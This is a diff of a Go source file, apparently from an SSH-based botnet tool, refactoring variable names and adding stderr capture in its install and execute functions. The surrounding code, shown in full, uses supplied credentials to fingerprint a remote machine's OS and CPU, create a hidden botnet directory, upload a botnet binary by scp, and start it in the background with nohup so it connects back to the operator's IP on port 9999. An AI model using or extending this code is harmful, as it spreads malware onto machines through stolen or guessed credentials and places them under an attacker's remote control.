@@ -2,8 +2,10 @@ package ssh
 
 import (
 	"fmt"
+	"io"
 	"io/ioutil"
 	"net"
+	"os"
 	"strings"
 
 	"sync"
@@ -128,15 +130,14 @@ func (a *Attack) install(c *credential) {
 
 	// get the home path
 	fmt.Println("[*] getting home directory")
-	cmd := "pwd"
-	out, err := a.executeWithOutput(cmd, c)
+	homeDir, err := a.executeWithOutput("pwd", c)
 	if err != nil {
 		fmt.Printf("[ERROR] getting home directory %v\n", err)
 		return
 	}
 
 	nodeOS := "linux"
-	if strings.Contains(string(out), "Users") {
+	if strings.Contains(string(homeDir), "Users") {
 		nodeOS = "darwin"
 	}
 
@@ -144,20 +145,20 @@ func (a *Attack) install(c *credential) {
 	if nodeOS == "linux" {
 		fmt.Println("[*] getting architecture")
 		cmd := "cat /proc/cpuinfo | grep 'model name'"
-		out1, err := a.executeWithOutput(cmd, c)
+		cpuArch, err := a.executeWithOutput(cmd, c)
 		if err != nil {
 			fmt.Printf("[ERROR] getting architecture %v\n", err)
 			return
 		}
 
-		if strings.Contains(string(out1), "ARM") {
+		if strings.Contains(string(cpuArch), "ARM") {
 			arch = "arm"
 		}
 	}
 
 	// create the botnet bin path
 	fmt.Println("[*] creating botnet bin dir")
-	cmd = fmt.Sprintf("mkdir %s/botnet && mkdir %s/botnet/bin", strings.TrimSpace(string(out)), strings.TrimSpace(string(out)))
+	cmd := fmt.Sprintf("mkdir %s/botnet && mkdir %s/botnet/bin", strings.TrimSpace(string(homeDir)), strings.TrimSpace(string(homeDir)))
 	if err := a.execute(cmd, c); err != nil {
 		fmt.Printf("[ERROR] creating botnet dirs %v\n", err)
 		return
@@ -176,14 +177,14 @@ func (a *Attack) install(c *credential) {
 		path = fmt.Sprintf("%s/%s/%s/botnet", a.BinDir, nodeOS, arch)
 	}
 
-	if err := scp(path, strings.TrimSpace(string(out))+"/botnet/bin", sess); err != nil {
+	if err := scp(path, strings.TrimSpace(string(homeDir))+"/botnet/bin", sess); err != nil {
 		fmt.Printf("[ERROR] sending botnet binary %v\n", err)
 		return
 	}
 
 	// execute botnet client
 	localIP := getLocalIP()
-	cmd = fmt.Sprintf("nohup %s/botnet/bin/botnet -target %s -port 9999 connect > /dev/null 2>&1 &", strings.TrimSpace(string(out)), localIP)
+	cmd = fmt.Sprintf("nohup %s/botnet/bin/botnet -target %s -port 9999 connect > /dev/null 2>&1 &", strings.TrimSpace(string(homeDir)), localIP)
 	fmt.Println("[*] starting botnet on remote machine...")
 	if err := a.execute(cmd, c); err != nil {
 		fmt.Printf("[ERROR] executing botnet %v\n", err)
@@ -197,6 +198,12 @@ func (a *Attack) execute(cmd string, c *credential) error {
 		return err
 	}
 	defer sess.Close()
+
+	stderr, err := sess.StderrPipe()
+	if err != nil {
+		return err
+	}
+	go io.Copy(os.Stderr, stderr)
 
 	if err := sess.Start(cmd); err != nil {
 		return err
